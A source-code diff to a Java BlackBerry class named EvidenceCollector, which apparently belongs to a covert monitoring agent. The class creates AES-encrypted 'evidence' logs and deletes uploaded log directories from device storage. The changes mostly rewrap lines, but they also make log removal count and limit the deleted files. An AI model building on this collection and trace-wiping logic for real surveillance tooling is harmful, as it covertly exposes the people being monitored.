@@ -97,7 +97,8 @@ public final class EvidenceCollector implements Singleton {
      */
     public static synchronized EvidenceCollector getInstance() {
         if (instance == null) {
-            instance = (EvidenceCollector) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (EvidenceCollector) RuntimeStore.getRuntimeStore().get(
+                    GUID);
             if (instance == null) {
                 final EvidenceCollector singleton = new EvidenceCollector();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
@@ -169,7 +170,8 @@ public final class EvidenceCollector implements Singleton {
      */
     public synchronized Evidence factory(final Agent agent, final boolean onSD) {
 
-        final Evidence log = new Evidence(agent.agentId, agent.onSD(), keys.getAesKey());
+        final Evidence log = new Evidence(agent.agentId, agent.onSD(), keys
+                .getAesKey());
 
         return log;
     }
@@ -225,7 +227,8 @@ public final class EvidenceCollector implements Singleton {
      *            the agent
      * @return the vector
      */
-    public synchronized Vector makeNewName(final Evidence log, final boolean onSD) {
+    public synchronized Vector makeNewName(final Evidence log,
+            final boolean onSD) {
         final Date timestamp = log.timestamp;
         final int progressive = getNewProgressive();
 
@@ -292,21 +295,24 @@ public final class EvidenceCollector implements Singleton {
      * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
      */
 
-    public synchronized void removeLogDirs() {
+    public synchronized int removeLogDirs(int numFiles) {
         //#ifdef DEBUG
         debug.info("removeLogDirs");
         //#endif
-        removeLogRecursive(Path.SD(), true);
-        removeLogRecursive(Path.USER(), true);
+        int removed = removeLogRecursive(Path.SD(), numFiles);
+        removed = removeLogRecursive(Path.USER(), numFiles - removed);
+        return removed;
     }
 
-    private void removeLogRecursive(final String basePath, final boolean delete) {
+    private int removeLogRecursive(final String basePath, int numFiles) {
 
         //#ifdef DEBUG
-        debug.info("RemovingLog: " + basePath);
+        debug.info("RemovingLog: " + basePath + " numFiles: " + numFiles);
         Check.requires(!basePath.startsWith("file://"),
                 "basePath shouldn't start with file:// : " + basePath);
         //#endif
+
+        int numLogsDeleted = 0;
 
         FileConnection fc;
         try {
@@ -322,13 +328,18 @@ public final class EvidenceCollector implements Singleton {
                     debug.trace("removeLog: " + file);
 
                     //#endif
-                    removeLogRecursive(basePath + file, true);
+                    int removed = removeLogRecursive(basePath + file,
+                            numFiles - numLogsDeleted);
+                    //#ifdef DEBUG
+                    debug.trace("removeLog removed: " + removed);
+                    //#endif
+                    
+                    numLogsDeleted += removed;
                 }
             }
 
-            if (delete) {
-                fc.delete();
-            }
+            fc.delete();
+            numLogsDeleted += 1;
 
             fc.close();
 
@@ -337,6 +348,11 @@ public final class EvidenceCollector implements Singleton {
             debug.error("removeLog: " + basePath + " ex: " + e);
             //#endif
         }
+
+        //#ifdef DEBUG
+        debug.trace("removeLogRecursive removed: " + numLogsDeleted);
+        //#endif
+        return numLogsDeleted;
 
     }
 
@@ -418,7 +434,8 @@ public final class EvidenceCollector implements Singleton {
         FileConnection fcDir = null;
         // FileConnection fcFile = null;
         try {
-            fcDir = (FileConnection) Connector.open("file://" + currentPath + dir);
+            fcDir = (FileConnection) Connector.open("file://" + currentPath
+                    + dir);
 
             final Enumeration fileLogs = fcDir.list("*", true);
 
